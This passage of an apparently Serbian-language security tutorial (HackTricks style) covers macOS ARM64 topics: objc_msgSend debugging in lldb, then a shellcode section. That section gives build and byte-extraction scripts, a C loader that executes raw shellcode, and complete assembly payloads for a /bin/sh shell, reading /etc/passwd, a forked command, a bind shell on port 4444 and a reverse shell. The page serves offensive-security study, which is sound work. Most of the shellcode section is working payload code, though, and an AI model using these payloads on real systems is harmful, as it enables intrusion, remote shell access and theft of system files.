Na primer, poziv `gettimeofdate` direktno čita vrednost `timeval` sa comm page-a.

### objc_msgSend

Veoma je uobičajeno pronaći ovu funkciju u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode Objective-C objekta.

Parametri ([više informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Pointer ka instanci
- x1: op -> Selector metode
- x2... -> Preostali argumenti pozvane metode

Dakle, ako postavite breakpoint pre branch-a ka ovoj funkciji, lako možete pronaći šta se poziva u lldb-u (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će pokrenuti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Postavljanjem env promenljive **`NSObjCMessageLoggingEnabled=1`** moguće je beležiti kada se ova funkcija pozove u fajl kao što je `/tmp/msgSends-pid`.
>
> Takođe, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binary-ja možete videti druge env promenljive koje možete koristiti za **logovanje** trenutka kada se dogode određene Objc-C radnje.

Kada se ova funkcija pozove, potrebno je pronaći pozvanu metodu navedene instance; za to se obavlja nekoliko pretraga:

- Izvršiti optimistic cache lookup:
- Ako je uspešan, završiti
- Preuzeti runtimeLock (read)
- Ako je (realize && !cls->realized), realize class
- Ako je (initialize && !cls->initialized), initialize class
- Pokušati sa sopstvenim cache-om klase:
- Ako je uspešno, završiti
- Pokušati sa listom metoda klase:
- Ako je pronađena, popuniti cache i završiti
- Pokušati sa cache-om superclass-a:
- Ako je uspešno, završiti
- Pokušati sa listom metoda superclass-a:
- Ako je pronađena, popuniti cache i završiti
- Ako je (resolver), pokušati sa method resolver-om i ponoviti od class lookup-a
- Ako smo i dalje ovde (= sve ostalo nije uspelo), pokušati sa forwarder-om

### Shellcodes

Za kompilaciju:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Za izdvajanje bajtova:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije verzije macOS-a:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto [**ovde**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Čitanje pomoću cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji predstavlja stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozivanje komande pomoću sh iz fork-a kako glavni proces ne bi bio prekinut
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **portu 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell ka **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Reference

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
